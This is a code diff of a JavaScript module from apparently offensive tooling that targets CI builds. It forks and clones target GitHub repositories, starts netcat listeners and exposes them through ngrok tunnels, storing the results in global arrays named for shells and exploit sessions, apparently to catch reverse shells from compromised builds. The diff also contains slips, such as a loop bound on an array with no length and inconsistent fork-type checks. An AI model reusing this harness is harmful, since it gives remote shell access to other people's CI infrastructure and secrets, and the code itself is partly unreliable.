@@ -65,6 +65,7 @@ module.exports = {
     server_arr - Array of server objects from NGROK (not used that much)
     url_arr - Array of full NGROK URLS (also not used much)
   */
+
   exploitMultiHarness: (auth_type, fork_type, target_type, exploit_name, cb) => {
     let token = "";
     let authed_user = "";
@@ -114,14 +115,51 @@ module.exports = {
         }
         let ng_token = ngtoken;
 
-        // Fork all repos in targets
-        repos.forkAll(token, authed_user, () => {
+        if (fork_type == 'forked') {
+          // Fork all repos in targets
+          repos.forkAll(token, authed_user, () => {
+
+            // Clone all repos that have been forked
+            repos.cloneAllRepos(type, authed_user, () => {
+
+              // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
+              targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {
+
+                // Start a netcat listener for each cloned repo
+                server.startNetcatAll(ci_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {
+
+                  // Push global lists for new shells
+                  global.shells_arr.push.apply(global.shells_arr, nc_arr);
+                  global.duplexInput_arr.push.apply(global.duplexInput_arr, dupIn_arr);
+                  global.duplexOutput_arr.push.apply(global.duplexOutput_arr, dupOut_arr);
+                  global.session_name_arr.push.apply(global.session_name_arr, raw_targets);
+                  for (let l = 0; l < global.nc_arr; l++) {
+                    global.session_exploit_arr.push(exploit_name);
+                  }
+
+                  // Start an Ngrok instances for listening
+                  log(green("Starting ngrok Services..."));
+                  server.startNgrokAll(ports_arr, ng_token, (err, hostname_arr, port_arr, server_arr, url_arr) => {
+                    if (err) {
+                      log(err);
+                      return cb(err);
+                    } else {
+                      return cb(null, token, authed_user, raw_targets, ci_targets, hostname_arr, port_arr, server_arr, url_arr)
+                    }
+                  })
+
+                })
+              })
+            })
+          })
+        } else {
+          // Fork all repos in targets
 
           // Clone all repos that have been forked
           repos.cloneAllRepos(type, authed_user, () => {
 
             // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
-            targets.getForkedTargetType(target_type, authed_user, (raw_targets, ci_targets) => {
+            targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {
 
               // Start a netcat listener for each cloned repo
               server.startNetcatAll(ci_targets, (nc_arr, ports_arr, dupIn_arr, dupOut_arr) => {
@@ -149,7 +187,9 @@ module.exports = {
               })
             })
           })
-        })
+
+        }
+
       })
     }
   },
@@ -232,13 +272,38 @@ module.exports = {
         let ng_token = ngtoken;
 
         // Fork all repos in targets
-        repos.forkAll(token, authed_user, () => {
+        if (type == 'forked') {
+          repos.forkAll(token, authed_user, () => {
 
+            // Clone all repos that have been forked
+            repos.cloneAllRepos(type, authed_user, () => {
+
+              // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
+              targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {
+
+                // Start a netcat listener for each cloned repo
+                server.startNetcatTempListener((nc, duplex, nc_port) => {
+
+                  // Start an Ngrok instance for listening
+                  log(green("Starting ngrok Services..."));
+                  server.startNgrokConnect(nc_port, ng_token, (err, hostname, ng_port, ng_server, ng_url) => {
+                    if (err) {
+                      log(err);
+                      return cb(err);
+                    } else {
+                      return cb(null, token, authed_user, raw_targets, ci_targets, nc, duplex, nc_port, hostname, ng_port, ng_server, ng_url);
+                    }
+                  });
+                });
+              })
+            })
+          })
+        } else {
           // Clone all repos that have been forked
           repos.cloneAllRepos(type, authed_user, () => {
 
             // CREATE TRAVIS SPECIFIC LIST HERE TO USE FROM HERE ON OUT
-            targets.getForkedTargetType(target_type, authed_user, (raw_targets, ci_targets) => {
+            targets.getForkedTargetType(target_type, authed_user, type, (raw_targets, ci_targets) => {
 
               // Start a netcat listener for each cloned repo
               server.startNetcatTempListener((nc, duplex, nc_port) => {
@@ -256,7 +321,9 @@ module.exports = {
               });
             })
           })
-        })
+
+        }
+
       })
     }
   }
